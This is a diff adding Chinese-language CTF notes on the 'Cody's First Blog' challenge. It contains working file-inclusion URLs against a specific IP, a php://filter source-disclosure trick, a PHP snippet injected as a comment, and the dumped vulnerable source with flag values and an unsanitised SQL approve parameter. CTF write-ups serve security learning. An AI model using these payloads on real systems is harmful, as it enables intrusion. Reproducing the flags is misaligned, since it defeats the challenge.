@@ -59,6 +59,13 @@ Table: albums
 | 1  | Kittens |
 
 * Cody's First Blog
+  心得，通过不断的试错，会不断往正确的路线靠拢，open mind。提示是很重要的，
+  要注意错误提示的细节，意义有很大不同。
+  比如这个ctf,限制服务器访问外网，限制php文件写入，并限制除了http以外的文件包含，造成看上去不能利用。
+  细心注意错误提示的不同，就能找到线索。
+
+  注意代码运行的环境，配置也很重要。
+
   http://35.190.155.168:5001/ee2b7eb1b5/?page=http://www.bing.com/test
  <b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />
 </h1>
@@ -72,6 +79,112 @@ Table: albums
   此页面未作验证
    /?page=admin.inc
 
+  包含local地址：
+   http://35.190.155.168:5001/33ca0bc2a1/?page=http://127.0.0.1/?page=admin.inc
+
+http://35.190.155.168:5001/33ca0bc2a1/?page=http://127.0.0.1/?page=php://filter/convert.base64-encode/resource=index
+   会执行首页提交注入的php代码。
+
+   没有写文件，访问外网的权限。
+   <?php
+$a = file_get_contents("index.php");
+echo $a;
+?>
+  上面的代码,会获得提交comment页面。
+#+begin_example  index.php
+<?php
+	// ^FLAG^5eb6781b20f6b70f4d36556b45fe33af8b4d7281a4ab3befdc62555a79538d03$FLAG$
+	mysql_connect("localhost", "root", "");
+	mysql_select_db("level4");
+	$page = isset($_GET['page']) ? $_GET['page'] : 'home.inc';
+	if(strpos($page, ':') !== false && substr($page, 0, 5) !== "http:")
+		$page = "home.inc";
+
+	if(isset($_POST['body'])) {
+		mysql_query("INSERT INTO comments (page, body, approved) VALUES ('" . mysql_real_escape_string($page) . "', '" . mysql_real_escape_string($_POST['body']) . "', 0)");
+		if(strpos($_POST['body'], '<?php') !== false)
+			echo '<p>^FLAG^e8dc80f7e9e5bc510d492f30d5cf58d834212d486093dd4e8598ead57c9de6c1$FLAG$</p>';
+?>
+	<p>Comment submitted and awaiting approval!</p>
+	<a href="javascript:window.history.back()">Go back</a>
+<?php
+		exit();
+	}
+
+	ob_start();
+	include($page . ".php");
+	$body = ob_get_clean();
+?>
+<!doctype html>
+<html>
+	<head>
+		<title><?php echo $title; ?> -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1><?php echo $title; ?></h1>
+		<?php echo $body; ?>
+		<br>
+		<br>
+		<hr>
+		<h3>Comments</h3>
+		<!--<a href="?page=admin.auth.inc">Admin login</a>-->
+		<h4>Add comment:</h4>
+		<form method="POST">
+			<textarea rows="4" cols="60" name="body"></textarea><br>
+			<input type="submit" value="Submit">
+		</form>
+<?php
+	$q = mysql_query("SELECT body FROM comments WHERE page='" . mysql_real_escape_string($page) . "' AND approved=1");
+	while($row = mysql_fetch_assoc($q)) {
+		?>
+		<hr>
+		<p><?php echo $row["body"]; ?></p>
+		<?php
+	}
+?>
+	</body>
+</html>
+#+end_example
+
+#+begin_example home.inc.php
+<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
+
+<?php
+foreach(scandir("posts", 1) as $value) {
+	if($value == "." || $value == "..") continue;
+	ob_start();
+	include("posts/" . $value);
+	$body = ob_get_clean();
+	?>
+	<h2><?php echo $title; ?></h2>
+	<?php
+	echo $body;
+}
+?>
+
+<?php $title = "Home"; ?>
+
+#+end_example
+
+
+#+begin_example admin.inc.php
+<h2>Pending Comments</h2>
+<?php
+	if(isset($_GET["approve"]))
+		mysql_query("UPDATE comments SET approved=1 WHERE id=" . $_GET["approve"]);
+	$q = mysql_query("SELECT id, page, body FROM comments WHERE approved=0");
+	while($row = mysql_fetch_assoc($q)) {
+		?>
+		<hr>
+		<h3>Comment on <?php echo htmlentities($row["page"]); ?></h3>
+		<p><?php echo htmlentities($row["body"]); ?></p>
+		<a href="?page=admin.inc&approve=<?php echo $row["id"]; ?>">Approve Comment</a>
+		<?php
+	}
+
+	$title = "Admin";
+?>
+#+end_example
 * ticketastic
 Database: level7
 Table: users
